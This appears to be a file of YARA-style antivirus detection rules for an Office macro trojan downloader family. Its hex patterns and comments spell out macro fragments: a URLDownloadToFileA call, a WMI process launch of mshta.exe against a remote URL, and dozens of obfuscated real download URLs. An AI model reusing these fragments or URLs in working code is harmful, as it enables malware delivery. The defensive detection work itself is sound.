
rule TrojanDownloader_O97M_EncDoc_RQ_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.RQ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_01_0 = {22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 22 } //1 "URLDownloadToFileA"
		$a_01_1 = {20 3d 20 53 70 6c 69 74 28 65 2c 20 77 69 6e 64 28 22 2b 22 2c 20 34 29 29 } //1  = Split(e, wind("+", 4))
		$a_03_2 = {26 20 4d 69 64 28 [0-0f] 29 20 26 20 4d 69 64 28 [0-0f] 29 } //1
		$a_03_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-2f] 29 } //1
		$a_01_4 = {20 3d 20 22 68 74 74 70 73 3a 2f 2f 22 20 26 20 79 } //1  = "https://" & y
		$a_01_5 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 20 28 22 72 50 72 69 6e 74 5f 22 20 26 20 22 31 22 29 } //1 Application.Run ("rPrint_" & "1")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}
rule TrojanDownloader_O97M_EncDoc_RQ_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.RQ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {3d 20 6f 62 6a 57 4d 49 53 65 72 76 69 63 65 2e 67 65 74 28 22 57 69 6e 33 32 5f 22 20 26 20 22 50 72 6f 63 65 73 73 22 20 26 20 22 53 74 61 72 74 75 70 22 29 } //1 = objWMIService.get("Win32_" & "Process" & "Startup")
		$a_01_1 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 22 77 69 6e 22 20 26 20 22 6d 67 6d 74 73 22 20 26 20 22 3a 5c 5c 22 20 26 20 73 74 72 43 6f 6d 70 75 74 65 72 20 26 20 22 5c 72 6f 6f 74 22 20 26 20 22 5c 63 69 6d 76 32 22 29 } //1 = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
		$a_01_2 = {6f 62 6a 50 72 6f 63 65 73 73 2e 43 72 65 61 74 65 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 5c 6d 73 68 74 61 2e 65 78 65 20 68 74 74 70 73 3a 2f 2f 73 65 72 76 69 63 65 2d 37 70 78 65 6c 32 62 6f 2d 31 33 30 34 33 34 33 39 35 33 2e 67 7a 2e 61 70 69 67 77 2e 74 65 6e 63 65 6e 74 63 73 2e 63 6f 6d 2f 70 69 63 6d 61 67 65 22 } //1 objProcess.Create "C:\Windows\System32\mshta.exe https://service-7pxel2bo-1304343953.gz.apigw.tencentcs.com/picmage"
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_RQ_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.RQ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 29 00 00 "
		
	strings :
		$a_03_0 = {68 74 74 70 73 3a 2f 2f 63 6f 72 74 69 6e 61 73 74 65 6c 61 73 79 74 72 61 7a 6f 73 2e 63 6f 6d 2f [0-0a] 2f 73 65 63 2e 68 74 6d 6c } //1
		$a_03_1 = {68 74 74 70 73 3a 2f 2f 6f 72 71 75 69 64 65 61 76 61 6c 6c 65 6e 61 74 61 2e 63 6f 6d 2f [0-0a] 2f 73 65 63 2e 68 74 6d 6c } //1
		$a_03_2 = {68 74 74 70 73 3a 2f 2f 66 75 6e 64 61 63 69 6f 6e 76 65 72 64 61 64 65 72 6f 73 68 65 72 6f 65 73 2e 63 6f 6d 2f [0-0a] 2f 73 65 63 2e 68 74 6d 6c } //1
		$a_03_3 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 22 26 22 2f 22 26 22 2f 67 65 6e 65 72 61 74 6f 72 75 6c 75 62 61 62 61 6e 75 2e 72 6f 2f [0-0f] 2f 73 6f 74 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 } //1
		$a_03_4 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 22 26 22 2f 22 26 22 2f 6f 74 74 61 77 61 70 72 6f 63 65 73 73 73 65 72 76 65 72 73 2e 63 61 2f [0-0f] 2f 73 6f 74 2e 68 74 6d 6c 22 } //1
		$a_03_5 = {22 68 22 26 22 74 74 70 73 3a 2f 2f 74 6f 74 61 6c 6c 79 62 61 6b 65 64 2e 63 61 2f [0-0f] 2f 73 6f 74 2e 68 22 26 22 74 6d 6c } //1
		$a_03_6 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 72 69 63 61 72 64 6f 70 69 72 65 73 66 6f 74 6f 67 72 61 66 69 61 2e 63 6f 6d 2f [0-0f] 22 26 22 68 6f 73 74 2e 68 74 6d 6c } //1
		$a_03_7 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 6b 65 79 73 69 74 65 2e 63 6f 6d 2e 63 6f 2f [0-0f] 22 26 22 68 6f 73 74 2e 68 74 6d 6c } //1
		$a_03_8 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 63 6f 6c 65 67 69 6f 62 69 6c 69 6e 67 75 65 70 69 6f 78 69 69 2e 63 6f 6d 2e 63 6f 2f [0-0f] 22 26 22 68 6f 73 74 2e 68 74 6d 6c } //1
		$a_03_9 = {68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 65 6c 69 74 65 6b 68 61 74 73 61 63 63 6f 2e 63 6f 2e 6b 65 2f [0-0f] 2f 64 61 79 2e 68 22 26 22 74 6d 6c 22 } //1
		$a_03_10 = {68 22 26 22 74 22 26 22 74 70 73 3a 2f 2f 73 75 6b 6d 61 62 61 6c 69 2e 63 6f 6d 2f [0-0f] 2f 64 61 79 2e 68 22 26 22 74 6d 6c 22 } //1
		$a_03_11 = {22 68 22 26 22 74 22 26 22 74 70 73 3a 2f 2f 6c 66 7a 6f 6d 62 69 65 67 61 6d 65 73 2e 63 6f 6d 2f [0-0f] 2f 64 61 79 2e 68 22 26 22 74 22 26 22 6d 6c 22 } //1
		$a_03_12 = {68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 66 69 6e 65 6a 65 77 65 6c 73 2e 63 6f 6d 2e 61 75 2f [0-0f] 2f [0-07] 2e 68 22 26 22 74 22 26 22 6d 6c 22 } //1
		$a_03_13 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 74 68 69 65 74 62 69 61 67 74 2e 63 6f 6d 2f [0-0f] 2f [0-07] 2e 68 22 26 22 74 6d 6c 22 } //1
		$a_03_14 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 6e 65 77 2e 61 6d 65 72 69 63 6f 6c 64 2e 63 6f 6d 2f [0-0f] 2f [0-07] 2e 68 22 26 22 74 22 26 22 6d 6c } //1
		$a_03_15 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 73 22 26 22 74 22 26 22 6f 6e 65 68 69 6c 6c 2d 6e 67 2e 63 6f 6d 2f [0-0a] 2f 62 6f 6c 64 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 } //1
		$a_03_16 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 3a 2f 2f 76 22 26 22 6f 22 26 22 64 22 26 22 76 22 26 22 61 72 6b 61 73 70 72 69 6e 67 73 2e 63 6f 6d 2f [0-0a] 2f 62 6f 6c 64 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c } //1
		$a_03_17 = {68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 6e 22 26 22 69 22 26 22 6c 65 2d 70 6c 61 73 74 2e 63 6f 6d 2f [0-0a] 2f 62 6f 6c 64 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 20 22 } //1
		$a_03_18 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 69 22 26 22 6e 66 61 22 26 22 63 6f 72 61 75 74 6f 2e 63 6f 6d 2f [0-0a] 2f 62 6f 72 74 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 } //1
		$a_03_19 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 72 6f 22 26 22 62 22 26 22 72 61 6e 6d 61 6c 6c 2e 63 6f 6d 2f [0-0a] 2f 62 6f 72 74 2e 68 22 26 22 74 22 26 22 6d } //1
		$a_03_20 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 64 22 26 22 72 22 26 22 65 61 6d 6f 6e 76 69 62 65 73 2e 63 6f 6d 2f [0-0a] 2f 62 6f 72 74 2e 68 22 26 22 74 22 26 22 6d 6c 22 } //1
		$a_03_21 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 3a 2f 2f 61 22 26 22 6c 22 26 22 6c 65 6e 63 6f 67 72 61 64 69 6e 67 74 72 61 63 74 6f 72 73 65 72 76 69 63 65 2e 63 6f 6d 2f [0-0a] 2f 61 6c 66 61 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 } //1
		$a_03_22 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 61 22 26 22 6c 22 26 22 6c 65 6e 63 6f 64 65 6d 6f 2e 63 6f 6d 2f [0-0a] 2f 61 6c 66 61 2e 68 22 26 22 74 22 26 22 6d 6c } //1
		$a_03_23 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 62 22 26 22 65 22 26 22 6e 69 64 69 63 69 6f 6e 2e 69 6e 2f [0-0a] 2f 61 6c 66 61 2e 68 22 26 22 74 22 26 22 6d 6c } //1
		$a_03_24 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 70 22 26 22 64 6d 67 74 63 2e 6f 72 67 2f [0-0f] 2f 6e 61 74 75 72 65 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 } //1
		$a_03_25 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 63 22 26 22 6f 72 6f 6e 61 76 69 72 75 73 65 78 70 6c 61 6e 61 74 69 6f 6e 2e 63 6f 6d 2f [0-0f] 2f 6e 61 74 75 72 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 } //1
		$a_03_26 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 73 22 26 22 69 22 26 22 6c 76 65 72 6c 69 6e 69 6e 67 6f 68 69 6f 2e 63 6f 6d 2f [0-0f] 2f 6e 61 74 75 2e 68 22 26 22 74 22 26 22 6d 6c 22 } //1
		$a_03_27 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 72 61 22 26 22 62 65 64 63 2e 63 6f 6d 2f [0-0f] 2f 72 6f 62 2e 68 22 26 22 74 22 26 22 6d 6c 22 } //1
		$a_03_28 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 73 68 22 26 22 79 61 6d 73 67 72 6f 75 70 2e 63 6f 6d 2f [0-0f] 2f 72 6f 62 65 2e 68 22 26 22 74 22 26 22 6d 6c 22 } //1
		$a_03_29 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 70 61 22 26 22 72 22 26 22 74 69 75 76 61 6d 6f 73 76 69 61 6a 61 72 2e 63 6f 6d 2f [0-0f] 2f 72 6f 62 65 72 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 } //1
		$a_01_30 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 70 72 66 22 26 22 65 22 26 22 6c 65 63 74 22 26 22 72 69 22 26 22 63 61 6c 2e 63 6f 6d 2e 61 75 2f 30 50 39 69 6a 58 5a 35 50 6d 39 4e 2f 72 6f 63 6b 73 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c } //1 "h"&"t"&"t"&"ps://prf"&"e"&"lect"&"ri"&"cal.com.au/0P9ijXZ5Pm9N/rocks.h"&"t"&"m"&"l
		$a_01_31 = {22 68 22 26 22 74 74 22 26 22 70 3a 2f 2f 73 22 26 22 61 22 26 22 62 65 72 22 26 22 65 73 22 26 22 70 6f 64 65 72 2e 63 6f 6d 2e 62 6f 2f 37 6e 75 55 37 41 42 4f 6a 37 2f 72 6f 22 26 22 63 6b 2e 68 22 26 22 74 22 26 22 6d 6c } //1 "h"&"tt"&"p://s"&"a"&"ber"&"es"&"poder.com.bo/7nuU7ABOj7/ro"&"ck.h"&"t"&"ml
		$a_01_32 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 61 22 26 22 75 74 68 30 2e 66 61 68 22 26 22 69 6d 22 26 22 61 68 6d 65 64 2e 63 6f 6d 2f 64 6a 44 65 30 65 78 53 4b 77 4d 2f 72 6f 6b 2e 68 22 26 22 74 22 26 22 6d 6c } //1 "h"&"t"&"t"&"ps://a"&"uth0.fah"&"im"&"ahmed.com/djDe0exSKwM/rok.h"&"t"&"ml
		$a_03_33 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 3a 2f 2f 61 6e 6a 75 22 26 22 6e 67 61 6e 2e 73 75 6b 22 26 22 61 6c 75 22 26 22 79 75 2d 70 61 6e 67 61 6c 65 22 26 22 6e 67 61 6e 2e 64 65 73 61 2e 69 64 2f [0-0a] 2f 6c 65 6f 6e 73 2e 68 22 26 22 74 22 26 22 6d 22 } //1
		$a_03_34 = {22 6c 22 2c 22 4d 2e 2e 22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 62 61 72 22 26 22 67 75 22 26 22 6e 61 2e 70 6f 6c 69 63 65 2e 67 6f 76 2e 62 64 2f [0-0f] 2f 6c 65 6f 6e 2e 68 22 26 22 74 22 26 22 6d 6c 22 } //1
		$a_03_35 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 6d 22 26 22 75 74 22 26 22 65 63 2e 63 6f 2e 7a 61 2f [0-0f] 2f 6c 65 6f 73 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 } //1
		$a_01_36 = {22 68 22 26 22 74 22 26 22 74 70 73 3a 2f 2f 61 72 61 63 22 26 22 6f 6e 73 22 26 22 75 6c 22 26 22 74 6f 72 69 22 26 22 61 79 22 26 22 73 6f 6c 22 26 22 75 63 69 22 26 22 6f 6e 65 73 2e 63 6f 6d 2f 54 54 6f 70 49 32 4f 78 58 2f 67 6f 68 2e 67 22 26 22 69 22 26 22 66 22 } //1 "h"&"t"&"tps://arac"&"ons"&"ul"&"tori"&"ay"&"sol"&"uci"&"ones.com/TTopI2OxX/goh.g"&"i"&"f"
		$a_01_37 = {22 68 22 26 22 74 74 22 26 22 70 73 3a 2f 2f 6c 61 22 26 22 6b 69 73 22 26 22 75 72 22 26 22 75 2e 63 6f 6d 2f 52 6f 62 22 26 22 68 70 39 63 6e 4a 4a 2f 67 6f 68 2e 67 22 26 22 69 22 26 22 66 22 } //1 "h"&"tt"&"ps://la"&"kis"&"ur"&"u.com/Rob"&"hp9cnJJ/goh.g"&"i"&"f"
		$a_01_38 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 74 61 6b 65 74 75 69 74 69 6f 6e 73 2e 63 6f 6d 2f 64 54 45 4f 64 4d 42 79 6f 72 69 2f 6a 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c } //1 "h"&"t"&"t"&"p"&"s://taketuitions.com/dTEOdMByori/j.h"&"t"&"m"&"l
		$a_01_39 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 63 6f 6e 73 74 72 75 63 74 6f 72 61 63 68 67 2e 63 6c 2f 65 46 53 4c 62 36 65 56 2f 6a 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c } //1 "h"&"t"&"t"&"p"&"s://constructorachg.cl/eFSLb6eV/j.h"&"t"&"m"&"l
		$a_01_40 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 6f 65 6c 2e 74 67 2f 4d 53 4f 46 6a 68 30 45 58 52 52 38 2f 6a 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c } //1 "h"&"t"&"t"&"p"&"s://oel.tg/MSOFjh0EXRR8/j.h"&"t"&"m"&"l
	condition:
		((#a_03_0  & 1)*1+(#a_03_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1+(#a_03_4  & 1)*1+(#a_03_5  & 1)*1+(#a_03_6  & 1)*1+(#a_03_7  & 1)*1+(#a_03_8  & 1)*1+(#a_03_9  & 1)*1+(#a_03_10  & 1)*1+(#a_03_11  & 1)*1+(#a_03_12  & 1)*1+(#a_03_13  & 1)*1+(#a_03_14  & 1)*1+(#a_03_15  & 1)*1+(#a_03_16  & 1)*1+(#a_03_17  & 1)*1+(#a_03_18  & 1)*1+(#a_03_19  & 1)*1+(#a_03_20  & 1)*1+(#a_03_21  & 1)*1+(#a_03_22  & 1)*1+(#a_03_23  & 1)*1+(#a_03_24  & 1)*1+(#a_03_25  & 1)*1+(#a_03_26  & 1)*1+(#a_03_27  & 1)*1+(#a_03_28  & 1)*1+(#a_03_29  & 1)*1+(#a_01_30  & 1)*1+(#a_01_31  & 1)*1+(#a_01_32  & 1)*1+(#a_03_33  & 1)*1+(#a_03_34  & 1)*1+(#a_03_35  & 1)*1+(#a_01_36  & 1)*1+(#a_01_37  & 1)*1+(#a_01_38  & 1)*1+(#a_01_39  & 1)*1+(#a_01_40  & 1)*1) >=1
 
}